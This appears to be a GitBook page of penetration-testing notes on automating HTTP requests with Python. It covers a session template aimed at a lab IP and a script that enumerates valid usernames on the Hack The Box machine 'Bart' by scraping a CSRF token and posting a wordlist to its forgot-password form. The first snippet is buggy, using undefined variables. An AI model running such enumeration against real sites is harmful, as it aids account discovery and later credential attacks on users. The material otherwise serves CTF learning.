# Python Automation 1

## Sessions request

```text
import requests
import re

def TestRequest(filename):
    
    url = "http://10.10.10.93/transfer.aspx"
    
    s = requests.session()
    
    # For GET requests
    data1 = s.get(url)
    print(r.text)
    
    # For post requests
    # post_data = { 'session': value, 'text': value2 }
    data2 = s.post(url, data=post_data)
    
    
TestRequest("Please Subscribe")
```

## Example 1 : Serialized POST request automation for upload bypass

![request](../../../.gitbook/assets/image%20%28120%29.png)

![python automation](../../../.gitbook/assets/image%20%28121%29.png)

Here burp was used to validate if the request is generate properly.

![final script](../../../.gitbook/assets/image%20%28122%29.png)

## Example 2 : Using regular expression

```text
import requests, re, signal, sys

#Send Request

if __name__ == '__main__':

    url = "http://bart.htb/monitor/?action=forgot"

    s = requests.session()

    data = s.get(url)

    csrf_value = re.findall(r'<input type="hidden" name="csrf" value="(.*?)"', data.text)

    # print(csrf_value[0])

    with open("/home/user/Documents/HTB/Bart/content/users.txt", "r") as f:
        for username in f.read().splitlines():
            post_data = {
                    'csrf' : csrf_value,
                    'user_name' : '%s' % username
            }

            data = s.post(url, data=post_data)

            if "The provided username could not be found." not in data.text:
                print("Valid User is : %s" % username)

```

